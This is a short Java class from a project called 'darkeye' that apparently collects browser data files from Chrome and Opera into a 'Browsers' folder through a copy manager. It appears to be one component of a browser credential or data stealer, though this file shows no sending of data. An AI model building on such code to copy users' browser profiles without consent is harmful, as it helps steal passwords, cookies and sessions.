package org.spray.darkeye.managers;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import org.spray.darkeye.module.BrowserModule;
import org.spray.darkeye.module.browsers.ChromeBrowser;
import org.spray.darkeye.module.browsers.OperaBrowser;
import org.spray.darkeye.objects.Data;

public class BrowserManager extends CopyManager {

	public BrowserManager(String path) {
		super(path);
	}

	private List<BrowserModule> browsers = Arrays.asList(new ChromeBrowser(), new OperaBrowser());

	@Override
	protected List<Data> getData() {
		List<Data> data = new ArrayList<>();
		browsers.forEach(browser -> data.add(new Data(browser.getFiles(), browser.getBrowser())));
		return data;
	}

	@Override
	public String getPath() {
		return "Browsers";
	}

}
